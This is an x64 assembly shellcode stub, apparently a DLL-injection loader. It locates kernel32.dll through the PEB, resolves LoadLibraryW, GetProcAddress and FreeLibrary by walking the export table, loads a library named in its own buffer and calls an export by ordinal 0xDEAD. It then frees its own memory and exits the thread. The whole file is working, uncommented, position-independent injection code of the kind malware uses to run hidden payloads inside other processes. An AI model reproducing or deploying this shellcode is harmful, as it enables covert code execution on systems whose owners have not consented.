BITS 64

ShellCode:
  push    rbx
  sub     rsp,20h
  mov   rax,qword [gs:30h]
  mov     rbx,rcx
  mov     rdx,qword [rax+60h]
  mov     qword [rcx+1000h],rdx
  mov     r10,qword [rdx+18h]
  mov     rdx,qword [rcx+1008h]
  add     r10,20h
  mov     r9,qword [r10]
  cmp     r9,r10
  je      label_0xac

label_0x34:
  mov     rax,qword [r9+50h]
  test    rdx,rdx
  jne     label_0x67

label_0x3d:
  cmp     dword [rax],45004Bh
  jne     label_0x67

label_0x45:
  cmp     dword [rax+4],4E0052h
  jne     label_0x67

label_0x4e:
  cmp     dword [rax+8],4C0045h
  jne     label_0x67

label_0x57:
  cmp     dword [rax+0Ch],320033h
  jne     label_0x67

label_0x60:
  cmp     word [rax+10h],2Eh
  je      label_0x94

label_0x67:
  cmp     dword [rax],65006Bh
  mov     r8,rdx
  jne     label_0xa2

label_0x72:
  cmp     dword [rax+4],6E0072h
  jne     label_0xa2

label_0x7b:
  cmp     dword [rax+8],6C0065h
  jne     label_0xa2

label_0x84:
  cmp     dword [rax+0Ch],320033h
  jne     label_0xa2

label_0x8d:
  cmp     word [rax+10h],2Eh
  jne     label_0xa2

label_0x94:
  mov     rdx,qword [r9+20h]
  mov     qword [rcx+1008h],rdx
  mov     r8,rdx

label_0xa2:
  mov     r9,qword [r9]
  cmp     r9,r10
  jne     label_0x34

label_0xaa:
  jmp     label_0xaf

label_0xac:
  mov     r8,rdx

label_0xaf:
  mov     eax,5A4Dh
  cmp     word [r8],ax
  jne     label_0x28c

label_0xbe:
  mov     edx,dword [r8+3Ch]
  cmp     dword [rdx+r8],4550h
  jne     label_0x28c

label_0xd0:
  lea     eax,[rdx+18h]
  mov     ecx,10Bh
  movzx   eax,word [rax+r8]
  cmp     ax,cx
  jne     label_0xe9

label_0xe2:
  mov     eax,78h
  jmp     label_0xfc

label_0xe9:
  mov     ecx,20Bh
  cmp     ax,cx
  jne     label_0x28c

label_0xf7:
  mov     eax,88h

label_0xfc:
  mov     qword [rsp+40h],rsi
  add     eax,edx
  mov     qword [rsp+48h],rdi
  xor     r9d,r9d
  mov     r10d,dword [rax+r8]
  add     r10,r8
  mov     r11d,dword [r10+20h]
  mov     edi,dword [r10+24h]
  add     r11,r8
  mov     esi,dword [r10+1Ch]
  add     rdi,r8
  add     rsi,r8
  cmp     dword [r10+18h],r9d
  jbe     label_0x1ea

label_0x131:
  movzx   eax,word [rdi+r9*2]
  mov     ecx,dword [r11+r9*4]
  add     rcx,r8
  mov     edx,dword [rsi+rax*4]
  add     rdx,r8
  cmp     qword [rbx+1010h],0
  jne     label_0x176

label_0x14d:
  cmp     dword [rcx],64616F4Ch
  jne     label_0x176

label_0x155:
  cmp     dword [rcx+4],7262694Ch
  jne     label_0x176

label_0x15e:
  cmp     dword [rcx+8],57797261h
  jne     label_0x176

label_0x167:
  cmp     byte [rcx+0Ch],0
  jne     label_0x176

label_0x16d:
  mov     qword [rbx+1010h],rdx
  jmp     label_0x1dd

label_0x176:
  cmp     qword [rbx+1018h],0
  jne     label_0x1a3

label_0x180:
  cmp     dword [rcx],65657246h
  jne     label_0x1a3

label_0x188:
  cmp     dword [rcx+4],7262694Ch
  jne     label_0x1a3

label_0x191:
  cmp     dword [rcx+8],797261h
  jne     label_0x1a3

label_0x19a:
  mov     qword [rbx+1018h],rdx
  jmp     label_0x1dd

label_0x1a3:
  cmp     qword [rbx+1020h],0
  jne     label_0x1dd

label_0x1ad:
  cmp     dword [rcx],50746547h
  jne     label_0x1dd

label_0x1b5:
  cmp     dword [rcx+4],41636F72h
  jne     label_0x1dd

label_0x1be:
  cmp     dword [rcx+8],65726464h
  jne     label_0x1dd

label_0x1c7:
  mov     eax,dword [rcx+0Ch]
  and     eax,0FFFFFFh
  cmp     eax,7373h
  jne     label_0x1dd

label_0x1d6:
  mov     qword [rbx+1020h],rdx

label_0x1dd:
  inc     r9d
  cmp     r9d,dword [r10+18h]
  jb      label_0x131

label_0x1ea:
  mov     rax,qword [rbx+1010h]
  lea     rcx,[rbx+800h]
  call    rax
  mov     rsi,qword [rsp+40h]
  mov     rdi,rax
  test    rax,rax
  je      label_0x23e

label_0x219:
  mov     r8,qword [rbx+1020h]
  mov     edx,0DEADh
  mov     rcx,rax
  call    r8
  test    rax,rax
  je      label_0x235

label_0x230:
  mov     rcx,rbx
  call    rax

label_0x235:
  mov     rcx,rdi
  call    qword [rbx+1018h]

label_0x23e:
  mov     rax,qword [rbx+1020h]
  lea     rdx,[rbx + string_ExitThread]
  mov     rcx,qword [rbx+1008h]
  call    rax
  mov     r8,qword [rbx+1020h]
  lea     rdx,[rbx + string_VirtualFree]
  mov     rcx,qword [rbx+1008h]
  mov     rdi,rax
  call    r8
  test    rax,rax
  je      label_0x287

label_0x271:
  test    rdi,rdi
  je      label_0x287

label_0x276:
  xor     edx,edx
  mov     r8d,8000h
  mov     rcx,rbx
  push    rdi
  jmp     rax

label_0x287:
  mov     rdi,qword [rsp+48h]

label_0x28c:
  add     rsp,20h
  pop     rbx
  ret

string_VirtualFree db "VirtualFree",0
string_ExitThread db "ExitThread",0
